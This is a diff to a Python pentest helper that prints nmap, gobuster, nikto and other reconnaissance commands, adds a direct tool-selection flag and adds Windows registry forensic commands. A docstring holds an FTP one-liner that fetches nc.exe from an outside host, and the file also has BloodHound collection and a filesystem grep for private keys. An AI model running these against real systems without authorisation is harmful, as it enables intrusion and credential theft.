@@ -1,8 +1,5 @@
-#!/usr/bin/env python3.6
 import argparse
 import pyperclip
-
-# import only system from os 
 from os import system, name 
 
 parser = argparse.ArgumentParser(description='Program created by eRaMvn. This program generates commands for pentesters to avoid mistakes during an engagement', 
@@ -11,6 +8,7 @@ parser.add_argument('source', metavar=" [source ip]", help="source ip address - 
 parser.add_argument('target', metavar=" [target ip]", help="target's ip address")
 parser.add_argument('-lp', type=int, metavar="[port]", default=443, help='local port to listen to. Default port is 443')
 parser.add_argument('-d', metavar="[directory]", default="~/Desktop", help='directory where files can be stored')
+parser.add_argument('-c', metavar="[tool_name]", default="", help='quickly obtain the tool command without going through the program flow')
 parser.add_argument('-v', action='version', version='%(prog)s version 1.1')
 
 args = parser.parse_args()
@@ -18,22 +16,16 @@ source_ip = args.source
 local_port = args.lp
 target_ip = args.target
 store_directory = args.d
+tool_to_retrieve = args.c
 
 r"""
 To be implemented:
-cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -recent_docs > G:\Netwars\Analysis\recent_docs_vibranium.csv
-cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -search_history > G:\Netwars\Analysis\search_history_vibranium.csv
-cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -opensave_mru > G:\Netwars\Analysis\opensave_mru_vibranium.csv
-cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -userassist > G:\Netwars\Analysis\userassist_vibranium.csv
-
 LECmd.exe -d "E:\[root]\Users\vibranium\AppData\Roaming\Microsoft\Windows\Recent" --csv "G:\Netwars\Analysis\Shellitems_vibranium" -q
 SBECmd.exe -d "E:\[root]\Users\vibranium\AppData\Local\Microsoft\Windows" --csv "G:\Netwars\Analysis" -q
 PECmd.exe -d "E:\[root]\Windows\Prefetch" -q --csv G:\Netwars\Analysis
-
 C:\"Forensic Program Files"\Python\ShimCacheParser.py -i SYSTEM -o G:\Netwars\Analysis\shimcache_vibranium.csv
 
 Invoke-Bloodhound -CollectionMethod All
-
 (for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) >ftp.txt&&ftp -s:ftp.txt
 netstat -alnp
 """
@@ -74,30 +66,46 @@ def copy_to_clipboard(options):
         print(str(key) + ". " + options[key][1])
         print("-" * 70)
 
-    print('Please select commmand number to copy to clipboard. Type "0" to return to tool selection, "c" to clear screen. ')
+    if tool_to_retrieve != "":
+        print('Please select commmand number to copy to clipboard. Type "e" to quit, "c" to clear screen. ')
+    else:
+        print('Please select commmand number to copy to clipboard. Type "0" to return to tool selection, "c" to clear screen. ')
+
     while True:
         try:
             choice = input("Input: ").strip()
-            if choice == "0" or choice == "b" or choice == "back" or choice == "exit":
+            if choice == "0" or choice == "b" or choice == "back" or choice == "exit" or choice == "e" or choice == "quit" or choice == "q":
                 print("-" * 70)
-                print("Taking you back to tool selection!")
+                if tool_to_retrieve != "":
+                    print("Program exits!")
+                else: 
+                    print("Taking you back to tool selection!")
                 print("-" * 70)
                 break
             elif choice == "c" or choice == "clear":
                 clear()
-                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
+                if tool_to_retrieve != "":
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
+                else:
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
             elif choice == "l" or choice == "list":
                 for key in options:
                     print("---" + options[key][0] + "---")
                     print(str(key) + ". " + options[key][1])
                     print("-" * 70)
             elif int(choice) > len(options) or int(choice) < 0:
-                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
+                if tool_to_retrieve != "":
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
+                else:
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
             else:
                 #Copy command to clipboard
                 pyperclip.copy(options[int(choice)][1])
                 print("It has been copied to your clipboard!")
-                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
+                if tool_to_retrieve != "":
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
+                else:
+                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
         except:
             print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
            
@@ -111,11 +119,11 @@ def nmap():
     ports = input("Input: ").strip()
     if ports == "":
         ports = "[edit port]"
-    options = {1 : ["nmap phase 1", f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_nmap_tcp_ports.txt {target_ip}"],
-        2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}"],
-        3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}"],
-        4: ["nmap udp scan", f"nmap -Pn -p- -nvvv -sU --stats-every 3m --max-retries 2 --min-rate 5000 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}"],
-        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_nmap_firewalk.txt {target_ip}"],
+    options = {1 : ["nmap phase 1", f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_network_nmap_tcp_ports.txt {target_ip}"],
+        2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_network_nmap_detailed.txt {target_ip}"],
+        3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_network_nmap_vuln_scan.txt {target_ip}"],
+        4: ["nmap udp scan", f"nmap -Pn -p- -nvvv -sU --stats-every 3m --max-retries 2 --min-rate 5000 -oN {store_directory}/{target_ip}_network_nmap_udp_ports.txt {target_ip}"],
+        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_network_nmap_firewalk.txt {target_ip}"],
     }
 
     copy_to_clipboard(options)
@@ -162,9 +170,9 @@ def gobuster():
     if word_list == "":
         word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
 
-    options = {1 : ["Linux server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .php,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt"],
-        2 : ["Windows server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .asp,.aspx,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt"],
-        3 : ["cgi-bin directory", f"gobuster -u http://{url}:80/cgi-bin -w {word_list} -t 100 -x .pl,.sh -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster_cgi.txt"],
+    options = {1 : ["Linux server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .php,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster.txt"],
+        2 : ["Windows server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .asp,.aspx,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster.txt"],
+        3 : ["cgi-bin directory", f"gobuster -u http://{url}:80/cgi-bin -w {word_list} -t 100 -x .pl,.sh -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster_cgi.txt"],
     }
 
     copy_to_clipboard(options)
@@ -175,7 +183,7 @@ def nikto():
     if url == "":
         url = target_ip
 
-    options = {1 : ["Scan everything with nikto", f"nikto -h http://{url} | tee {store_directory}/{url}_nikto.txt"],
+    options = {1 : ["Scan everything with nikto", f"nikto -h http://{url} | tee {store_directory}/{url}_webapp_nikto.txt"],
     }
     
     copy_to_clipboard(options)
@@ -186,8 +194,8 @@ def unicorn():
     if url == "":
         url = target_ip
 
-    options = {1 : ["TCP scan", f"unicornscan -pa -r50 -mT {url} | tee {store_directory}/{url}_unicorn_tcp.txt"],
-        2 : ["UDP scan", f"unicornscan -pa -r50 -mU {url} | tee {store_directory}/{url}_udp_ports.txt"],
+    options = {1 : ["TCP scan", f"unicornscan -pa -r50 -mT {url} | tee {store_directory}/{url}_network_unicorn_tcp.txt"],
+        2 : ["UDP scan", f"unicornscan -pa -r50 -mU {url} | tee {store_directory}/{url}_network_udp_ports.txt"],
     }
     
     copy_to_clipboard(options)
@@ -280,7 +288,7 @@ def cewl():
     if url == "":
         url = target_ip
 
-    options = {1 : ["Get all words on a page", f"cewl {url} -w {store_directory}/{target_ip}_cewl.txt"],
+    options = {1 : ["Get all words on a page", f"cewl {url} -w {store_directory}/{target_ip}_webapp_cewl.txt"],
     }
     
     copy_to_clipboard(options)
@@ -505,7 +513,17 @@ def others():
 
 def grep():
     options = {1 : ["Grep example 1", f"""grep -rnw '/' -e 'PRIVATE' 2>/dev/null"""],
-        2 : ["Grep example 2", f"""grep -Ril "nina" 2>/dev/null """],
+        2 : ["Grep example 2", f"""grep -Ril "nina" 2>/dev/null"""],
+    }
+    
+    copy_to_clipboard(options)
+
+def cafae():
+    options = {
+        1 : ["Get file recently opened", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -recent_docs > G:\Netwars\Analysis\recent_docs_vibranium.csv"""],
+        2 : ["Dump search history", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -search_history > G:\Netwars\Analysis\search_history_vibranium.csv"""],
+        3 : ["Get file recently opened in windows", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -opensave_mru > G:\Netwars\Analysis\opensave_mru_vibranium.csv"""],
+        4 : ["Track file recently used with userassist", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -userassist > G:\Netwars\Analysis\userassist_vibranium.csv"""]
     }
     
     copy_to_clipboard(options)
@@ -605,9 +623,14 @@ options = {"nmap" : nmap,
            "snmp" : snmp,
            "others": others,
            "grep": grep,
+           "cafae": cafae
 }
 
 systems = {"windows" : windows, "linux" : linux}
+
+if tool_to_retrieve != "":
+    options[tool_to_retrieve]()
+    exit()
 
 while True:
     print("You are currently in tool selection mode.  Please choose commmand to generate.")
@@ -637,7 +660,7 @@ while True:
                 print("Unrecognized input!")
     elif choice == "ch" or choice == "change":
         source_ip, target_ip, local_port = change(source_ip, target_ip, local_port)
-    elif choice == "e" or choice == "exit":
+    elif choice == "e" or choice == "exit" or choice == "quit" or choice == "q":
         print("Bye!")
         break
     elif choice not in options:
